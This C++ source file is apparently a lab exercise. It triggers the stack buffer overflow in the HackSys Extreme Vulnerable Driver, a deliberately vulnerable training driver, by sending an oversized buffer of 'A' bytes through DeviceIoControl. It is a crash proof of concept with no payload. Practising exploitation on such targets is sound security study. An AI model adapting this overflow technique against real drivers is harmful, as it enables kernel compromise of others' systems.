#include <iostream>
#include <Windows.h>
#include "hevd_stackoverflow.h"

//https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.h
#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER,FILE_ANY_ACCESS)

/*
- Get a handle to  the device driver the CreateFile
- Use DeviceIoControl to send an IRP packet
- The IRP is then passed down the Windows driver stack until a driver that can handle it is found
- pwn
*/

#define magicBufferSize 768

int hevd_stackoverflow()
{
	int ret = 0;
	printf("[*] Invoking hevd_stackoverflow\n");

	DWORD lpBytesReturned;
	PVOID pMemoryAddress = NULL;
	PULONG lpInBuffer = NULL;
	LPCSTR lpDeviceName = (LPCSTR)"\\\\.\\HackSysExtremeVulnerableDriver";
	SIZE_T nInBufferSize = magicBufferSize * sizeof(ULONG); // a probably big enough buffer

	// Getting device handle: https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
	HANDLE hDriver = CreateFileA(lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	// Error handling
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[*] Getting device handle failed: 0x%X\n",GetLastError());
		return 1;
	}
	printf("[*] DeviceHandle: 0x%p\n", hDriver);

	// Allocating memory for input buffer
	lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize);

	if (!lpInBuffer) {
		printf("[*] HeapAlloc Failed: 0x%X\n",GetLastError());
		return 1;
	}
	printf("[*] InputBuffer size: 0x%X\n", (int)nInBufferSize);
	printf("[*] InputBuffer addr: 0x%p\n", lpInBuffer);

	// Filling the buffer with our payload
	printf("[*] Populating payload");
	RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41); // 0x41=A 

	// Sending Payload
	printf("[*] Sending Payload");
	DeviceIoControl(hDriver,
		HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
		(LPVOID)lpInBuffer,
		(DWORD)nInBufferSize,
		NULL,
		0,
		&lpBytesReturned,
		NULL);
	printf("[*] Payload sent");

	// cleanup
	printf("[*] Heap Freeing: 0x%p",lpInBuffer);
	HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);

	return ret;
}
